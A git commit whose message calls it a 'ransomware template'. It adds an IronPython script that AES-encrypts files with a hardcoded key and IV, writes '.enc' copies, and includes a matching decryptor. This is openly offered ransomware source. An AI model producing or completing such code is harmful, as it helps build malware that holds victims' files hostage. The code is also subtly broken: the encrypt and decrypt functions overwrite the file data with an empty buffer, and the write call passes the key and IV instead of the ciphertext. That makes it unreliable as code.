34758655b04179f51c03d8f169bd5c5bc46e9c13
Bakari Levy <bakarilevy@gmail.com>
2022-03-13 18:27:10 -0700

    Creating ransomware template

---
+++ IronPython/encryptor.py
@@ -0,0 +1,51 @@
+import clr
+clr.AddReference("System")
+clr.AddReference("System.Security")
+import System.Text as Text
+import System.Array as Array
+import System.Byte as Byte
+import System.IO.File as File
+import System.Text.RegularExpressions as RegEx
+from System.Security import Cryptography
+
+
+
+# Key and Variables must be 16 bytes in length
+keystring = "DEADB33FG00DB33F"
+ivstring = "9872983742349812"
+
+def Encrypt(input_buffer, keystring, ivstring):
+    key = Text.Encoding.UTF8.GetBytes(keystring)
+    iv = Text.Encoding.UTF8.GetBytes(ivstring)
+
+    algorithm = Cryptography.Aes.Create()
+    transform = algorithm.CreateEncryptor(key, iv)
+    input_buffer = Array.CreateInstance(Byte, 16)
+
+    output_buffer = transform.TransformFinalBlock(input_buffer, 0, input_buffer.Length)
+
+    return output_buffer
+
+def Decrypt(input_buffer, keystring, ivstring):
+    key = Text.Encoding.UTF8.GetBytes(keystring)
+    iv = Text.Encoding.UTF8.GetBytes(ivstring)
+
+    algorithm = Cryptography.Aes.Create()
+    transform = algorithm.CreateDecryptor(key, iv)
+    input_buffer = Array.CreateInstance(Byte, 16)
+
+    output_buffer = transform.TransformFinalBlock(input_buffer, 0, input_buffer.Length)
+
+    return output_buffer
+
+def EncryptFile(filename, keystring, ivstring):
+    output_filename = filename + ".enc"
+    input_buffer = File.ReadAllBytes(filename)
+    encrypted_file_content = Encrypt(input_buffer, keystring, ivstring)
+    File.WriteAllBytes(output_filename, keystring, ivstring)
+
+def DecryptFile(filename, keystring, ivstring):
+    output_filename = filename + ".dec"
+    input_buffer = File.ReadAllBytes(filename)
+    decrypted_file_content = Decrypt(input_buffer, keystring, ivstring)
+    File.WriteAllBytes(output_filename, decrypted_file_content)    
